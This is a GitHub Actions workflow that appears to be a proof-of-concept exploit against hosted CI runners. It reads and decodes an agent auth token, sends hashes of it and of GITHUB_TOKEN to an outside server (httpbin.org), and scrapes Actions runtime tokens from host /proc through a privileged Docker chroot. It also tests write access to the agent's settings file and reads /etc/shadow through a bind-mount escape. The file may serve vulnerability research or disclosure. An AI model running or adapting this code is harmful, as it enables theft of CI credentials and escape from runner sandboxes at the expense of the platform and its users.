name: v66 - close all gaps - JWT TTL + exfil proof + ubuntu2204 + runtime token scope
on:
  workflow_dispatch:
jobs:

  probe-24:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:

      - name: v66a - authToken JWT payload decode (TTL, sub, iss, aud, exp, iat)
        continue-on-error: true
        run: |
          printf '%s\n' \
            'import json, base64, time, hashlib' \
            's = json.load(open("/opt/hca/.settings"))' \
            'token = s["authToken"]' \
            'payload_b64 = token.split(".")[1]' \
            'padded = payload_b64 + "=" * (4 - len(payload_b64) % 4)' \
            'payload = json.loads(base64.urlsafe_b64decode(padded))' \
            'now = int(time.time())' \
            'exp = payload.get("exp", 0)' \
            'iat = payload.get("iat", 0)' \
            'ttl_s = exp - iat if (exp and iat) else 0' \
            'exp_in = exp - now if exp else 0' \
            'print("=== authToken JWT FULL PAYLOAD (uid=1001, no Docker) ===")' \
            'for k, v in sorted(payload.items()): print("  " + str(k) + ": " + str(v))' \
            'print("ttl_seconds=" + str(ttl_s))' \
            'print("ttl_minutes=" + str(ttl_s // 60))' \
            'print("ttl_hours=" + str(round(ttl_s / 3600, 2)))' \
            'print("expires_in_seconds=" + str(exp_in))' \
            'print("token_sha256=" + hashlib.sha256(token.encode()).hexdigest())' \
            'print("token_len=" + str(len(token)))' \
            'print("traceApiUrl=" + s.get("traceApiUrl",""))' \
            'print("schedulerApiUrl=" + s.get("schedulerApiUrl",""))' \
            'print("=== DONE ===")' \
            > /tmp/v66a.py
          echo "=== Running as uid=1001 (no Docker) ==="
          id
          python3 /tmp/v66a.py

      - name: v66b - exfiltration round-trip proof (credential hashes arrive at external server)
        continue-on-error: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          printf '%s\n' \
            'import json, hashlib, subprocess, os' \
            's = json.load(open("/opt/hca/.settings"))' \
            'auth_sha256 = hashlib.sha256(s["authToken"].encode()).hexdigest()' \
            'gh_sha256 = hashlib.sha256(os.environ.get("GITHUB_TOKEN","").encode()).hexdigest()' \
            'body = json.dumps({"authToken_sha256": auth_sha256, "GITHUB_TOKEN_sha256": gh_sha256, "source": "hca-escape-poc-v66b", "authToken_len": len(s["authToken"]), "traceApiUrl": s.get("traceApiUrl","")})' \
            'print("=== EXFILTRATION CHANNEL PROOF ===")' \
            'print("sending_authToken_sha256=" + auth_sha256)' \
            'print("sending_GITHUB_TOKEN_sha256=" + gh_sha256)' \
            'print("target=https://httpbin.org/post (reflects POST body in response JSON)")' \
            'r = subprocess.run(["curl", "-s", "--max-time", "15", "-X", "POST", "https://httpbin.org/post", "-H", "Content-Type: application/json", "-d", body], capture_output=True, text=True)' \
            'try:' \
            '    resp = json.loads(r.stdout)' \
            '    received = resp.get("json", {})' \
            '    auth_ok = received.get("authToken_sha256") == auth_sha256' \
            '    gh_ok = received.get("GITHUB_TOKEN_sha256") == gh_sha256' \
            '    print("server_received_authToken_sha256=" + str(received.get("authToken_sha256","MISSING")))' \
            '    print("server_received_GITHUB_TOKEN_sha256=" + str(received.get("GITHUB_TOKEN_sha256","MISSING")))' \
            '    print("server_received_source=" + str(received.get("source","MISSING")))' \
            '    print("authToken_sha256_round_trip_match=" + str(auth_ok))' \
            '    print("GITHUB_TOKEN_sha256_round_trip_match=" + str(gh_ok))' \
            '    print("exfil_origin_ip=" + str(resp.get("origin","unknown")))' \
            '    if auth_ok and gh_ok: print("EXFIL_CONFIRMED: both credential hashes transmitted to and received by external server")' \
            '    else: print("EXFIL_PARTIAL: curl_exit=" + str(r.returncode) + " stdout_len=" + str(len(r.stdout)))' \
            'except Exception as e:' \
            '    print("parse_error=" + str(e))' \
            '    print("raw_response_head=" + r.stdout[:500])' \
            'print("=== DONE ===")' \
            > /tmp/v66b.py
          python3 /tmp/v66b.py

      - name: v66c - ACTIONS_RUNTIME_TOKEN scope decode (from host /proc, via chroot)
        continue-on-error: true
        run: |
          printf '%s\n' \
            'import os, base64, json, hashlib, time' \
            'TARGET = [b"ACTIONS_RUNTIME_TOKEN", b"ACTIONS_ID_TOKEN_REQUEST_TOKEN", b"ACTIONS_ID_TOKEN_REQUEST_URL", b"ACTIONS_RUNTIME_URL"]' \
            'found = {}' \
            'for pid in os.listdir("/proc"):' \
            '    if not pid.isdigit(): continue' \
            '    try:' \
            '        env = open("/proc/" + pid + "/environ", "rb").read()' \
            '    except Exception: continue' \
            '    for item in env.split(b"\x00"):' \
            '        if b"=" not in item: continue' \
            '        k, _, v = item.partition(b"=")' \
            '        if k in TARGET and k not in found: found[k] = v' \
            'print("=== ACTIONS RUNTIME TOKEN SCOPE ===")' \
            'for k, v in found.items():' \
            '    kd = k.decode()' \
            '    vd = v.decode(errors="replace")' \
            '    print("key=" + kd + " len=" + str(len(vd)) + " sha256=" + hashlib.sha256(v).hexdigest())' \
            '    segs = vd.split(".")' \
            '    if len(segs) >= 2:' \
            '        try:' \
            '            padded = segs[1] + "=" * (4 - len(segs[1]) % 4)' \
            '            payload = json.loads(base64.urlsafe_b64decode(padded))' \
            '            now = int(time.time())' \
            '            exp = payload.get("exp", 0)' \
            '            iat = payload.get("iat", 0)' \
            '            print("  JWT_PAYLOAD:")' \
            '            for pk, pv in sorted(payload.items()): print("    " + str(pk) + ": " + str(pv))' \
            '            if exp and iat: print("  ttl_minutes=" + str((exp - iat) // 60) + " expires_in_seconds=" + str(exp - now))' \
            '        except Exception as e: print("  decode_error=" + str(e))' \
            '    else: print("  value_head=" + vd[:120])' \
            'print("=== DONE ===")' \
            > /tmp/v66c.py
          echo "=== Decoding ACTIONS_RUNTIME_TOKEN JWT from host /proc (via chroot) ==="
          docker run --rm --privileged --net=host -v /:/host ubuntu:latest \
            chroot /host python3 /tmp/v66c.py

  probe-22:
    runs-on: ubuntu-22.04
    timeout-minutes: 10
    steps:

      - name: v66d - ubuntu-22.04 docker group + .settings 0666 + bind-mount escape
        continue-on-error: true
        run: |
          echo "=== RUNNER IDENTITY ON ubuntu-22.04 ==="
          id
          uname -r
          grep -E '^(NAME|VERSION_ID)=' /etc/os-release
          echo ""
          echo "=== DOCKER GROUP MEMBERSHIP (ubuntu-22.04) ==="
          getent group docker
          echo ""
          echo "=== .settings PERMISSIONS (ubuntu-22.04) ==="
          stat /opt/hca/.settings 2>/dev/null || echo ".settings_NOT_FOUND"
          echo ""
          echo "=== HCA BINARY (ubuntu-22.04) ==="
          ls -la /opt/hca/hosted-compute-agent 2>/dev/null || echo "hca_binary_NOT_FOUND"
          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -E '^[0-9]{8,}\.' | head -3 || true
          echo ""
          echo "=== CREDENTIAL READ AS uid=1001 WITHOUT DOCKER (ubuntu-22.04) ==="
          printf '%s\n' \
            'import json, hashlib' \
            'try:' \
            '    s = json.load(open("/opt/hca/.settings"))' \
            '    print("authToken_sha256=" + hashlib.sha256(s["authToken"].encode()).hexdigest()[:32])' \
            '    print("authToken_len=" + str(len(s["authToken"])))' \
            '    print("traceApiUrl=" + s.get("traceApiUrl",""))' \
            '    print("settings_readable_without_docker=TRUE")' \
            'except Exception as e: print("settings_read_error=" + str(e))' \
            > /tmp/v66d_read.py
          python3 /tmp/v66d_read.py
          echo ""
          echo "=== .settings WRITE TEST (ubuntu-22.04) ==="
          printf '%s\n' \
            'import json' \
            'try:' \
            '    orig = open("/opt/hca/.settings").read()' \
            '    s = json.loads(orig)' \
            '    s["quotaId"] = "v66d-ubuntu2204-write-confirmed"' \
            '    open("/opt/hca/.settings","w").write(json.dumps(s))' \
            '    c = json.load(open("/opt/hca/.settings"))' \
            '    print("WRITE_SUCCESS_ubuntu2204: quotaId=" + c["quotaId"])' \
            '    open("/opt/hca/.settings","w").write(orig)' \
            '    r = json.load(open("/opt/hca/.settings"))' \
            '    print("RESTORE_SUCCESS: quotaId=" + str(r.get("quotaId","restored")))' \
            '    print("settings_world_writable_ubuntu2204=TRUE")' \
            'except Exception as e: print("write_error=" + str(e))' \
            > /tmp/v66d_write.py
          python3 /tmp/v66d_write.py
          echo ""
          echo "=== BIND-MOUNT ESCAPE (ubuntu-22.04, no --privileged) ==="
          docker run --rm -v /:/host ubuntu:latest \
            sh -c 'echo "no_privflag_uid=$(id)" && head -2 /host/etc/shadow && echo "shadow_read_ubuntu2204=TRUE"'
          echo "=== DONE ==="
